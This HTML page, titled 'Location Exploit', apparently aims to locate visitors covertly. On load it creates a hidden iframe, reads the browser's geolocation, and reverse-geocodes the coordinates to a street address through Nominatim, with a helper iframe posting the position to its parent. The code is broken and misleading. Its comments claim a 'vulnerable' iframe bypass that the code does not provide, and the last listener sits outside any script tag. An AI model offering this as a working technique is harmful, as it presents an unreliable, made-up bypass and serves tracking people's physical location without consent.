<!DOCTYPE html>
<html>
<head>
 <title>Location Exploit</title>
</head>
<body onload="exploitGeolocation()">
 <script>
 async function exploitGeolocation() {
 // Create an invisible iframe with vulnerable browser User-Agent
 const iframe = document.createElement('iframe');
 iframe.style.display = 'none';
 iframe.src = 'https://example.com/geolocate.html';
 document.body.appendChild(iframe);

 // Wait for iframe to load
 await new Promise(resolve => setTimeout(resolve, 2000));

 // Access geolocation via vulnerable iframe context
 const position = await new Promise((resolve, reject) => {
 navigator.geolocation.getCurrentPosition(position => resolve(position), error => reject(error));
 });

 // Extract and log coordinates
 const latitude = position.coords.latitude;
 const longitude = position.coords.longitude;

 // Reverse geocode coordinates to address (optional)
 fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
 .then(response => response.json())
 .then(data => {
 const address = data.display_name;
 console.log(address);
 });
 }
 </script>
</body>
</html>

<!-- geolocate.html (inside the iframe) -->
<script>
 navigator.geolocation.getCurrentPosition(position => {
 parent.postMessage({ type: 'geolocation', data: position }, '*');
 });
</script>

<!-- Receive message in main page -->
window.addEventListener('message', event => {
 if (event.data.type === 'geolocation') {
 console.log(event.data.data);
 }
});
